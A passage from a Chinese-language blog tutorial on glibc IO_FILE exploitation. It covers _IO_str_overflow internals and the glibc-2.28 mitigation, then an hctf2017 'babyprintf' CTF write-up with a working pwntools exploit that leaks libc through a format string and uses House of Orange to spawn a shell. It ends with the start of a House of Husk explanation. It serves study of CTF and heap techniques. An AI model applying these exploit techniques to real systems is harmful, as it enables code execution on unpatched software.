_IO_FLAGS2_USER_WBUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> WEOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">wchar_t</span> *new_buf;</span><br><span class="line">	  <span class="type">wchar_t</span> *old_buf = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_wblen = _IO_wblen (fp);</span><br><span class="line">	  _IO_size_t new_size = <span class="number">2</span> * old_wblen + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (new_size &lt; old_wblen)</span><br><span class="line">	      || __glibc_unlikely (new_size &gt; SIZE_MAX / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)))</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">	  new_buf = (<span class="type">wchar_t</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size * <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>));</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> WEOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      __wmemcpy (new_buf, old_buf, old_wblen);</span><br><span class="line">	      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  __wmemset (new_buf + old_wblen, <span class="string">L&#x27;\0&#x27;</span>, new_size - old_wblen);</span><br><span class="line"></span><br><span class="line">	  _IO_wsetb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_base =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_end =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_ptr =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_wide_data-&gt;_IO_write_ptr++ = c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>_IO_wstr_finish</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wstr_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_wdefault_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="glibc-2-28-防御措施"><a href="#glibc-2-28-防御措施" class="headerlink" title="glibc-2.28 防御措施"></a>glibc-2.28 防御措施</h3><p>在 <code>glibc-2.28</code> 版本中，用操作堆的 <code>malloc</code> 函数和 <code>free</code> 函 数 替 换 原 来 在 <code>_IO_str_fields</code> 里 的 <code>_allocate_buffer</code> 和 <code>_free_buffer</code> 。 由 于 不 再 使 用 偏 移 ， 也 就 不 能 利 用 <code>__libc_IO_vtables</code> 上的 <code>vtable</code> 绕过检查，于是新的 <code>FOSP</code> 利用技术 就失效了。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wstr_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_wdefault_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  	<span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">	...</span><br><span class="line">  	pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  	<span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">			<span class="keyword">return</span> EOF;</span><br><span class="line">      	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="type">char</span> *new_buf;</span><br><span class="line">	  		<span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  		<span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  		<span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  		<span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    		<span class="keyword">return</span> EOF;</span><br><span class="line">            </span><br><span class="line">	  		new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wstr_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  	<span class="type">int</span> flush_only = c == WEOF;</span><br><span class="line">	...</span><br><span class="line">  	pos = fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  	<span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_wblen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="keyword">if</span> (fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">			<span class="keyword">return</span> WEOF;</span><br><span class="line">      	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="type">wchar_t</span> *new_buf;</span><br><span class="line">	  		<span class="type">wchar_t</span> *old_buf = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">	  		<span class="type">size_t</span> old_wblen = _IO_wblen (fp);</span><br><span class="line">	  		<span class="type">size_t</span> new_size = <span class="number">2</span> * old_wblen + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	  	<span class="keyword">if</span> (__glibc_unlikely (new_size &lt; old_wblen)</span><br><span class="line">	      	|| __glibc_unlikely (new_size &gt; SIZE_MAX / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)))</span><br><span class="line">	    	<span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">	  	new_buf = <span class="built_in">malloc</span> (new_size * <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>));</span><br><span class="line">	...</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure></div>

<h2 id="hctf2017-babyprintf"><a href="#hctf2017-babyprintf" class="headerlink" title="[hctf2017]babyprintf"></a><a class="link"   href="https://github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.25_pwn_hctf2017_babyprintf" >[hctf2017]babyprintf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查信息"><a href="#检查信息" class="headerlink" title="检查信息"></a>检查信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022173157389.png"
                      alt="image-20231022173157389"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022173259777.png"
                      alt="image-20231022173259777"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022172848195.png"
                      alt="image-20231022172848195"
                ></p>
<p>开了 <code>NX</code> 和 <code>Canary</code>，题目 <code>libc</code> 为 <code>2.24</code> 版本。</p>
<h3 id="试运行-1"><a href="#试运行-1" class="headerlink" title="试运行"></a>试运行</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022173559457.png"
                      alt="image-20231022173559457"
                ></p>
<h3 id="逆向分析-2"><a href="#逆向分析-2" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Init</span>(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    v4 = <span class="built_in">read_n</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0x1000</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = <span class="built_in">malloc</span>(v4);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;string: &quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(v3);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;result: &quot;</span>);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;too long&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">read_n</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="type">int</span>)v0;</span><br><span class="line">    v2 = _IO_getc(stdin);</span><br><span class="line">    v4[v0] = v2;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v0 == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[<span class="number">9</span>] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">strtoul</span>(v4, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">      v1 = <span class="number">9LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v4[v1] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strtoul</span>(v4, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于程序开启了 <code>FORTIFY</code> 机制， 因此在程序编译时所有的 <code>printf()</code> 都被 <code>__printf_chk()</code> 替换掉了，它有如下限制：</p>
<blockquote>
<ul>
<li>包含 <code>%n</code> 的格式化字符串不能位于程序内存中的可写地址。</li>
<li>当使用位置参数时，必须使用范围内的所有参数。所以如果要使用 <code>%7$p</code>，你必须同时使用<code>1</code>,<code>2</code>,<code>3</code>,<code>4</code>,<code>5</code>和<code>6</code>。</li>
</ul>
</blockquote>
<p>先分配 <code>size</code> 大小的空间（不超过0x1000），然后在这里读入字符串，由于使用的是 <code>gets()</code> 函数，存在堆溢出漏洞。然后直接调用<code>__printf_chk()</code> 打印这个字符串，存在栈信息泄露漏洞。</p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>前置脚本</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line">is_local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> io, elf, libc</span><br><span class="line">    <span class="keyword">if</span> is_local:</span><br><span class="line">        io = process(<span class="string">&#x27;./babyprintf&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&#x27;192.168.152.130&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    elf = ELF(<span class="string">&quot;./babyprintf&quot;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prf</span>(<span class="params">size, string</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;string: &quot;</span>, string)</span><br></pre></td></tr></table></figure></div>

<p><strong>泄露libc</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">16</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0xfe1</span>)              <span class="comment"># top chunk header</span></span><br><span class="line">    prf(<span class="number">16</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(io, &#x27;b *0x400810&#x27;)</span></span><br><span class="line">    prf(<span class="number">0x1000</span>, <span class="string">b&#x27;%p%p%p%p%p%pA&#x27;</span>)                <span class="comment"># _int_free in sysmalloc</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    libc_start_main = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;A&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">12</span>:], <span class="number">16</span>) - <span class="number">241</span></span><br><span class="line">    libc_base = libc_start_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;libc_base address: 0x%x&quot;</span> % libc_base)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023164753642.png"
                      alt="image-20231023164753642"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023164832351.png"
                      alt="image-20231023164832351"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023164859904.png"
                      alt="image-20231023164859904"
                ></p>
<p>通过溢出将 <code>top_chunk</code> 的 <code>size</code> 改成 <code>fe1</code>，然后利用申请 <code>0x1000 &gt; 0xfe1</code> 大小的 <code>chunk</code> 将 <code>old_top_chunk</code> 放进 <code>unsorted bin</code> 中，并利用第二次的格式化字符串漏洞泄露 <code>libc</code> 地址。</p>
<p><strong>house of orange</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_orange</span>():</span><br><span class="line">    io_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">    vtable_addr = libc_base + <span class="number">0x3BE4C0</span>          <span class="comment"># _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;_IO_list_all address: 0x%x&quot;</span> % io_list_all)</span><br><span class="line">    log.info(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;/bin/sh address: 0x%x&quot;</span> % bin_sh_addr)</span><br><span class="line">    log.info(<span class="string">&quot;vtable address: 0x%x&quot;</span> % vtable_addr)</span><br><span class="line"></span><br><span class="line">    _IO_buf_end = (bin_sh_addr - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line">    stream  = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)                <span class="comment"># fake header, fp-&gt;_flags, fp-&gt;_IO_read_ptr</span></span><br><span class="line">    stream += p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>)  <span class="comment"># fake bk pointer, fp-&gt;_IO_read_end, fp-&gt;_IO_read_base</span></span><br><span class="line">    stream += p64(<span class="number">0</span>)                            <span class="comment"># fp-&gt;_IO_write_base</span></span><br><span class="line">    stream += p64(<span class="number">0xffffffffffffffff</span>)           <span class="comment"># fp-&gt;_IO_write_ptr</span></span><br><span class="line">    stream += p64(<span class="number">0</span>) * <span class="number">2</span>                        <span class="comment"># fp-&gt;_IO_write_end, fp-&gt;_IO_buf_base</span></span><br><span class="line">    stream += p64(_IO_buf_end)                  <span class="comment"># fp-&gt;_IO_buf_end</span></span><br><span class="line">    stream  = stream.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    stream += p64(<span class="number">0</span>)                            <span class="comment"># fp-&gt;_mode</span></span><br><span class="line"></span><br><span class="line">    payload  = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">    payload += stream</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    payload += p64(vtable_addr)                 <span class="comment"># _IO_FILE_plus-&gt;vtable # 0xd8</span></span><br><span class="line">    payload += p64(system_addr)                 <span class="comment"># 0xe0</span></span><br><span class="line">    gdb.attach(io, <span class="string">&#x27;b *0x400810&#x27;</span>)</span><br><span class="line">    prf(<span class="number">16</span>, payload)</span><br><span class="line">    io.sendline(<span class="string">b&quot;0x1000&quot;</span>)        <span class="comment"># abort routine</span></span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure></div>

<p>利用堆溢出漏洞构造如下 <code>Heap</code> 与 <code>IO_FILE</code> 结构:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/babyprintf.png"
                      alt="babyprintf"
                ></p>
<p>我们需要利用 <code>abort</code> 调用 <code>_IO_OVERFLOW</code> 所以需要 <code>fp-&gt;_mode</code>为 <code>0</code> 且 <code>fp-&gt;_IO_write_ptr&gt;_fp-&gt;_IO_write_base</code>。然后利用 <code>_IO_str_overflow</code> 函数所以需要绕过以下检查。</p>
<ul>
<li><code>_IO_buf_base = 0</code>，<code>_IO_buf_end = (bin_sh_addr - 100) // 2</code></li>
<li><code>fp-&gt;_flags</code>要不包含<code>_IO_USER_BUF</code>，它被定义为 <code>1</code> ，即 <code>fp-&gt;_flags</code>最低位为 <code>0</code>。</li>
<li><code>_IO_write_ptr = ((bin_sh_addr - 100) // 2) +1</code> ,  <code>_IO_write_base = 0x0</code></li>
<li><code>fp-&gt;_s._allocate_buffer(fp+0xe0)</code> 改为 <code>system</code> 或 <code>one_gadget</code> 地址。</li>
</ul>
<p>利用 <code>house of orange</code> 将 <code>_IO_list_all</code> 的 <code>vtable</code> 指向 <code>_IO_str_jumps</code>，然后利用 <code>abort</code> 调用 <code>_IO_OVERFLOW-&gt;_IO_str_overflow</code> 然后进入我们上面讲的调用流，最后调用 <code>system(&quot;/bin/sh\x00&quot;)</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023172813846.png"
                      alt="image-20231023172813846"
                ></p>
<p>最后<code>libc</code> 的低 <code>32</code> 位地址为负时，攻击才会成功。</p>
<h1 id="House-of-husk"><a href="#House-of-husk" class="headerlink" title="House of husk"></a>House of husk</h1><p><code>glibc &gt;= 2.23</code></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这种攻击方式主要是利用了<code>printf</code>的一个调用链，应用场景是只能分配较大 <code>chunk</code> 时(超过fastbin)，存在或可以构造出 <code>UAF</code> 漏洞。<code>printf</code> 函数通过检查 <code>__printf_function_table</code> 是否为空，来判断是否有自定义的格式化字符，若为 <code>printf</code> 类格式字符串函数，则会根据格式字符串的种类去执行 <code>__printf_arginfo_table[spec]</code> 处的函数指针。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_function (<span class="type">int</span> spec, printf_function converter, printf_arginfo_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __register_printf_specifier (spec, converter, (printf_arginfo_size_function*) arginfo);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter, printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 不在 0~0xff 范围内则调用 __set_errno 并返回 -1</span></span><br><span class="line">  	<span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      	__set_errno (EINVAL);</span><br><span class="line">      	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> 	<span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  	__libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  	<span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 若spec为空，程序则会通过calloc分配两个堆地址来存放</span></span><br><span class="line">        <span class="comment">// __printf_arginfo_table和__printf_function_table</span></span><br><span class="line">      	__printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">		<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="built_in">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      	<span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">	  		result = <span class="number">-1</span>;</span><br><span class="line">	  		<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">      	__printf_function_table = (printf_function **)(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

